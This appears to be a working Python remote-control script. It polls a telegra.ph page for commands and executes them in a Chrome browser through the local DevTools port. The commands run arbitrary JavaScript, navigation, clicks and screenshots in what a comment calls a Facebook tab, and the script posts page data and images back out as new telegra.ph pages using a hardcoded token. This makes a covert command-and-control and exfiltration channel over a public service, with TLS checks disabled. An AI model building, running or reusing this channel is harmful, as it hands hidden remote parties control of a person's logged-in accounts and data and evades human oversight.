import requests, json, time, ssl, urllib.request, urllib.parse, threading, re, random, sys
print('POLLER23_START', time.time(), flush=True)

CMD_URL = 'https://telegra.ph/cmds-tom8470-11-05'
TGTOK   = 'b48b727fa4f0768fce9187c213960968b1ce3513c10808641b15d483c871'
TGAPI   = 'https://api.telegra.ph/'
U = urllib.request
CTX = ssl._create_unverified_context()

last_rev = 0
last_err = 'boot'
wsp = None          # work tab ws (facebook)
wsp_lock = threading.Lock()
wsj = None          # json tab ws (telegra.ph reader)
wsj_lock = threading.Lock()
sel = {'work': None, 'json': None}

def tgapi(method, params):
    data = urllib.parse.urlencode(params).encode()
    req = U.Request(TGAPI + method, data=data)
    r = json.load(U.urlopen(req, timeout=30, context=CTX))
    return r

def tgpage(name, text):
    """cria pagina telegraph com texto; retorna path"""
    try:
        nodes = [{"tag":"p","children":[text]}]
        r = tgapi('createPage', {'access_token':TGTOK,'title':name[:60],
                                 'content':json.dumps(nodes),'author_name':'devin'})
        if r.get('ok'): return r['result']['path']
        return 'ERR:'+json.dumps(r)[:120]
    except Exception as e:
        return 'ERR:'+str(e)[:150]

def post_out(payload):
    """publica resultado como pagina telegraph nova; chunks se >50KB"""
    try:
        s = json.dumps(payload)
        if len(s) <= 48000:
            tgpage('r%d' % int(time.time()*1000), s)
        else:
            pid = str(payload.get('id','x'))
            n = (len(s)+47999)//48000
            for i in range(n):
                tgpage('s%s-%d' % (pid,i), s[i*48000:(i+1)*48000])
            tgpage('r%d' % int(time.time()*1000), json.dumps({'id':pid,'chunked':n}))
    except Exception as e:
        global last_err
        last_err = 'post:'+str(e)[:150]

def tabs():
    return json.load(U.urlopen('http://localhost:9222/json/list', timeout=15))

def pages():
    return [t for t in tabs() if t.get('type')=='page']

def ws_open(url):
    from websocket import create_connection
    return create_connection(url, suppress_origin=True, timeout=45)

def csend(ws, method, params):
    ws.send(json.dumps({'id': random.randint(1,99999), 'method': method, 'params': params}))
    t = time.time()
    while time.time()-t < 40:
        r = json.loads(ws.recv())
        if 'result' in r or 'error' in r:
            return r
    return {'error':'timeout'}

def ev(ws, expr):
    r = csend(ws, 'Runtime.evaluate', {'expression':expr,'returnByValue':True})
    try: return r['result']['result'].get('value')
    except Exception: return 'ERR:'+json.dumps(r)[:150]

def connect_json_tab():
    global wsj
    ts = [t for t in pages() if 'telegra.ph/cmds-tom8470' in (t.get('url') or '')]
    if not ts:
        ws = ws_open(tabs()[0]['webSocketDebuggerUrl'])
        csend(ws,'Target.createTarget',{'url':CMD_URL})
        time.sleep(2)
        ts = [t for t in pages() if 'telegra.ph/cmds-tom8470' in (t.get('url') or '')]
    wsj = ws_open(ts[0]['webSocketDebuggerUrl'])

def connect_work_tab():
    global wsp
    ts = [t for t in pages() if 'telegra.ph' not in (t.get('url') or '')]
    if not ts:
        raise Exception('no-work-tab')
    wsp = ws_open(ts[0]['webSocketDebuggerUrl'])

def read_cmds():
    global wsj, last_rev
    for attempt in range(2):
        try:
            if wsj is None: connect_json_tab()
            with wsj_lock:
                csend(wsj,'Page.navigate',{'url':CMD_URL+'?r='+str(random.random())})
                time.sleep(1.6)
                txt = ev(wsj,'document.body.innerText') or ''
            i = txt.find('{"rev"')
            if i<0: return []
            j = txt.rfind('}')
            d = json.loads(txt[i:j+1])
            rev = d.get('rev') or 0
            if rev <= last_rev: return []
            last_rev = rev
            return d.get('cmds') or []
        except Exception as e:
            global last_err
            last_err = 'rc:'+str(e)[:150]
            try:
                if wsj: wsj.close()
            except Exception: pass
            wsj = None
    return []

def handle(m):
    global last_err, wsp
    typ = m.get('type')
    try:
        if typ == 'js':
            with wsp_lock:
                if wsp is None: connect_work_tab()
                try:
                    ans = ev(wsp, m['expr'])
                except Exception:
                    try:
                        if wsp: wsp.close()
                    except Exception: pass
                    wsp = None
                    connect_work_tab()
                    ans = ev(wsp, m['expr'])
            post_out({'id':m['id'],'result':ans})
        elif typ == 'goto':
            with wsp_lock:
                if wsp is None: connect_work_tab()
                csend(wsp,'Page.navigate',{'url':m['url']})
            post_out({'id':m['id'],'result':'nav-ok'})
        elif typ == 'shot':
            with wsp_lock:
                if wsp is None: connect_work_tab()
                r = csend(wsp,'Page.captureScreenshot',{'format':'jpeg','quality':50})
                d = r.get('result',{}).get('data','')
            post_out({'id':m['id'],'result':'SHOT:'+d})
        elif typ == 'click':
            with wsp_lock:
                if wsp is None: connect_work_tab()
                ok = True; err = ''
                for et in ('mousePressed','mouseReleased'):
                    r = csend(wsp,'Input.dispatchMouseEvent',{'type':et,'x':m['x'],'y':m['y'],'button':'left','clickCount':1})
                    if 'error' in r: ok=False; err=json.dumps(r)[:150]
            post_out({'id':m['id'],'result':'CLICKED' if ok else 'ERR:'+err})
        else:
            post_out({'id':m['id'],'result':'unknown'})
    except Exception as e:
        last_err = 'h:'+str(e)[:150]
        post_out({'id':m.get('id'),'result':'ERR:'+str(e)[:150]})

def hb_loop():
    while True:
        try:
            post_out({'hb':time.time(),'mode':'tglog23','err':last_err[:150]})
        except Exception: pass
        time.sleep(90)

def main():
    threading.Thread(target=hb_loop, daemon=True).start()
    post_out({'id':'boot','result':'POLLER23_READY'})
    while True:
        try:
            cmds = read_cmds()
            if cmds:
                for c in cmds:
                    post_out({'id':c.get('id'),'ack':True})
                    handle(c)
            time.sleep(2.5)
        except Exception as e:
            last_err = 'loop:'+str(e)[:150]
            time.sleep(6)

main()
